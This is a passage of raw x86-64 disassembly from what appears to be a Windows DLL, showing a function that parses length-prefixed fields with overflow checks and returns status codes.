   180005045:	33 c0                	xor    %eax,%eax
   180005047:	48 89 75 98          	mov    %rsi,-0x68(%rbp)
   18000504b:	44 8b f0             	mov    %eax,%r14d
   18000504e:	8b f0                	mov    %eax,%esi
   180005050:	8b 85 54 01 00 00    	mov    0x154(%rbp),%eax
   180005056:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
   18000505a:	eb 06                	jmp    0x180005062
   18000505c:	41 be 95 00 00 c0    	mov    $0xc0000095,%r14d
   180005062:	48 85 f6             	test   %rsi,%rsi
   180005065:	0f 84 4a ff ff ff    	je     0x180004fb5
   18000506b:	48 ff 15 3e 59 03 00 	rex.W call *0x3593e(%rip)        # 0x18003a9b0
   180005072:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180005077:	4c 8b c6             	mov    %rsi,%r8
   18000507a:	33 d2                	xor    %edx,%edx
   18000507c:	48 8b c8             	mov    %rax,%rcx
   18000507f:	48 ff 15 1a 59 03 00 	rex.W call *0x3591a(%rip)        # 0x18003a9a0
   180005086:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000508b:	e9 25 ff ff ff       	jmp    0x180004fb5
   180005090:	41 bd 95 00 00 c0    	mov    $0xc0000095,%r13d
   180005096:	45 8b f5             	mov    %r13d,%r14d
   180005099:	41 81 ce 00 00 00 10 	or     $0x10000000,%r14d
   1800050a0:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   1800050a5:	0f 8c 2b 01 00 00    	jl     0x1800051d6
   1800050ab:	33 f6                	xor    %esi,%esi
   1800050ad:	89 b5 58 01 00 00    	mov    %esi,0x158(%rbp)
   1800050b3:	c7 85 64 02 00 00 3c 	movl   $0x3c,0x264(%rbp)
   1800050ba:	00 00 00 
   1800050bd:	8d 46 48             	lea    0x48(%rsi),%eax
   1800050c0:	89 85 68 02 00 00    	mov    %eax,0x268(%rbp)
   1800050c6:	89 85 6c 02 00 00    	mov    %eax,0x26c(%rbp)
   1800050cc:	48 39 74 24 68       	cmp    %rsi,0x68(%rsp)
   1800050d1:	75 10                	jne    0x1800050e3
   1800050d3:	41 be 0d 00 00 c0    	mov    $0xc000000d,%r14d
   1800050d9:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   1800050de:	e9 62 03 00 00       	jmp    0x180005445
   1800050e3:	83 7c 24 60 01       	cmpl   $0x1,0x60(%rsp)
   1800050e8:	76 e9                	jbe    0x1800050d3
   1800050ea:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   1800050ef:	8b d6                	mov    %esi,%edx
   1800050f1:	48 8d 48 04          	lea    0x4(%rax),%rcx
   1800050f5:	48 3b c8             	cmp    %rax,%rcx
   1800050f8:	0f 82 3f 03 00 00    	jb     0x18000543d
   1800050fe:	8b 00                	mov    (%rax),%eax
   180005100:	48 03 c1             	add    %rcx,%rax
   180005103:	48 3b c1             	cmp    %rcx,%rax
   180005106:	0f 82 31 03 00 00    	jb     0x18000543d
   18000510c:	ff c2                	inc    %edx
   18000510e:	83 fa 01             	cmp    $0x1,%edx
   180005111:	72 de                	jb     0x1800050f1
   180005113:	44 8b 00             	mov    (%rax),%r8d
   180005116:	48 8d 48 04          	lea    0x4(%rax),%rcx
   18000511a:	48 3b c8             	cmp    %rax,%rcx
   18000511d:	0f 82 1a 03 00 00    	jb     0x18000543d
   180005123:	45 85 c0             	test   %r8d,%r8d
   180005126:	44 89 85 58 01 00 00 	mov    %r8d,0x158(%rbp)
   18000512d:	48 8b c6             	mov    %rsi,%rax
   180005130:	48 0f 45 c1          	cmovne %rcx,%rax
   180005134:	48 89 85 48 04 00 00 	mov    %rax,0x448(%rbp)
   18000513b:	83 7c 24 60 02       	cmpl   $0x2,0x60(%rsp)
   180005140:	76 91                	jbe    0x1800050d3
   180005142:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   180005147:	8b d6                	mov    %esi,%edx
   180005149:	48 8d 48 04          	lea    0x4(%rax),%rcx
   18000514d:	48 3b c8             	cmp    %rax,%rcx
   180005150:	0f 82 e7 02 00 00    	jb     0x18000543d
   180005156:	8b 00                	mov    (%rax),%eax
   180005158:	48 03 c1             	add    %rcx,%rax
   18000515b:	48 3b c1             	cmp    %rcx,%rax
   18000515e:	0f 82 d9 02 00 00    	jb     0x18000543d
   180005164:	ff c2                	inc    %edx
   180005166:	83 fa 02             	cmp    $0x2,%edx
   180005169:	72 de                	jb     0x180005149
   18000516b:	8b 10                	mov    (%rax),%edx
   18000516d:	48 8d 48 04          	lea    0x4(%rax),%rcx
   180005171:	48 3b c8             	cmp    %rax,%rcx
   180005174:	0f 82 c3 02 00 00    	jb     0x18000543d
   18000517a:	85 d2                	test   %edx,%edx
   18000517c:	89 95 70 02 00 00    	mov    %edx,0x270(%rbp)
   180005182:	48 8b c6             	mov    %rsi,%rax
   180005185:	48 0f 45 c1          	cmovne %rcx,%rax
   180005189:	48 89 85 50 04 00 00 	mov    %rax,0x450(%rbp)
   180005190:	41 8d 40 50          	lea    0x50(%r8),%eax
   180005194:	83 f8 50             	cmp    $0x50,%eax
   180005197:	0f 82 a0 02 00 00    	jb     0x18000543d
   18000519d:	8d 48 04             	lea    0x4(%rax),%ecx
   1800051a0:	3b c8                	cmp    %eax,%ecx
   1800051a2:	0f 82 95 02 00 00    	jb     0x18000543d
   1800051a8:	8d 04 11             	lea    (%rcx,%rdx,1),%eax
   1800051ab:	3b c1                	cmp    %ecx,%eax
   1800051ad:	0f 82 8a 02 00 00    	jb     0x18000543d
   1800051b3:	89 85 74 02 00 00    	mov    %eax,0x274(%rbp)
   1800051b9:	89 74 24 30          	mov    %esi,0x30(%rsp)
   1800051bd:	44 8b f6             	mov    %esi,%r14d
   1800051c0:	3d 00 00 40 00       	cmp    $0x400000,%eax
   1800051c5:	0f 86 6d 02 00 00    	jbe    0x180005438
   1800051cb:	41 be ff ff 00 80    	mov    $0x8000ffff,%r14d
   1800051d1:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   1800051d6:	45 33 db             	xor    %r11d,%r11d
   1800051d9:	48 8b b5 c8 05 00 00 	mov    0x5c8(%rbp),%rsi
   1800051e0:	48 85 f6             	test   %rsi,%rsi
   1800051e3:	74 23                	je     0x180005208
   1800051e5:	48 ff 15 c4 57 03 00 	rex.W call *0x357c4(%rip)        # 0x18003a9b0
   1800051ec:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800051f1:	4c 8b c6             	mov    %rsi,%r8
   1800051f4:	33 d2                	xor    %edx,%edx
